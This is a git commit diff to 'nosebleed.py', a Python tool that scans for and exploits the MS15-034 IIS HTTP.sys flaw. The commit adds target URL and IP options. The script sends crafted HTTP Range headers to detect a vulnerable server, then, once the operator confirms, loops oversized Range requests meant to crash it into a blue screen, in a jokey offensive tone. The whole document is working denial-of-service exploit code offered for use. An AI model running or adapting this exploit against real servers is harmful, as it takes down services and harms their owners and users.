599ea49ec67b118bb0182704c5a17d59ef15e08a
git-admin <webmaster@slotechco.com>
2015-04-16 00:17:09 -0700

    Refined and added -i and -t as well as more logic

--- nosebleed.py
+++ nosebleed.py
@@ -3,20 +3,13 @@
 
 import socket
 import sys
+import argparse
+from urlparse import urlparse
 
 # Check to make sure we have a target
 if len(sys.argv) <= 1:
     print("I need a hostname or IP address!")
     sys.exit()
-
-# convert the target to an IP address and bind to target variable
-tgt = sys.argv[1]
-try:
-    socket.inet_aton(tgt)
-    target = tgt
-except socket.error:
-    target = socket.gethostbyname(tgt)
-
 
 # This is the generic socket object that sends the exploit
 def exploit(payload, victim):
@@ -29,27 +22,82 @@ def exploit(payload, victim):
 
 
 # This function takes down a vulnerable server.
-def takedown():
-    for i in range(18-25):
+def takedown(vic, req):
+    if not req:
+        req = "/"
+    for i in range(18, 25):
         # iterate through a range from 18-25 to actually exploit the vuln with extreme prejudice
-        nosebleed = "GET / HTTP/1.1\r\nHost: blah\r\nRange: bytes=%s-18446744073709551615\r\n\r\n" % str(i)
-        exploit(nosebleed, target)
+        nosebleed = "GET %s HTTP/1.1\r\nHost: %s\r\nRange: bytes=%s-18446744073709551615\r\n\r\n" % (req, vic, str(i))
+        #print nosebleed
+        res = exploit(nosebleed, vic)
+        print res
 
 
-# Check for the vulnerability and exploit it if you wish
-knockknock = "GET / HTTP/1.1\r\nHost: blah\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
-check = exploit(knockknock, target)
-if "requested range not satisfiable" in check.lower():
-    doit = raw_input("They're vulnerable! Paint the window a pretty blue!?")
-    if "y" in doit.lower():
-        print("[+] Get ready for the boomsauce!")
-        takedown()
+def knock(vic, req):
+    if not req:
+        req = "/"
+    knockknock = "GET %s HTTP/1.1\r\nHost: %s\r\nRange: bytes=0-18446744073709551615\r\n\r\n" % (req, vic)
+    whosthere = exploit(knockknock, vic)
+    return whosthere
+
+
+if __name__ == "__main__":
+    # Setup argparse
+    parser = argparse.ArgumentParser(description='Scan for and exploit MS15-034 codenamed nosebleed',
+                                     usage='%(prog)s -t http://target.com/cgi-bin/login OR '
+                                           '%(prog)s -i 1.2.3.4 ')
+    parser.add_argument('-t', '--target', dest='tgt', help="Full URL to test. This will provide best results")
+    parser.add_argument('-i', '--ip', dest='ip', help="Single IP to test. Results may vary")
+    args = parser.parse_args()
+
+    ipaddr = False
+    url = False
+
+    # Handle args
+    if args.tgt:
+        target_info = urlparse(args.tgt)
+        target = target_info.netloc
+        path = target_info.path
+        print "Hitting: %s" % target
+        print "Path: %s" % path
+        url = True
+    elif args.ip:
+        try:
+            socket.inet_aton(args.ip)
+            target = args.ip
+            print "Hitting: %s" % target
+            ipaddr = True
+        except socket.error:
+            print("Invalid IP!! Try again...")
+            sys.exit()
     else:
-        print("How nice of you to spare them! :)")
+        print("You need to specify a target url with '-t' or an IP address with '-i'!! Exiting....")
+        parser.print_help()
         sys.exit()
-elif "The request has an invalid header name" in check.lower():
-    print("Looks like their sysadmins and security team are on top of it! It's patched!")
-    sys.exit()
+
+    # Check for the vulnerability and exploit it if you wish
+    if url:
+        check = knock(target, path)
+    elif ipaddr:
+        check = knock(target, None)
+    # print check
+    if "requested range not satisfiable" in check.lower():
+        doit = raw_input("They're vulnerable! Paint the window a pretty blue!?")
+        if "y" in doit.lower():
+            print("[+] Get ready for the boomsauce!")
+            if url:
+                takedown(target, path)
+            elif ipaddr:
+                takedown(target, None)
+        else:
+            print("How nice of you to spare them! :)")
+            sys.exit()
+    elif "the request has an invalid header name" in check.lower():
+        print("Looks like their sysadmins and security team are on top of it! It's patched!")
+        sys.exit()
+    elif "microsoft" not in check.lower():
+        print("This is either not an IIS server or something went wrong")
+        sys.exit()
 
 
 
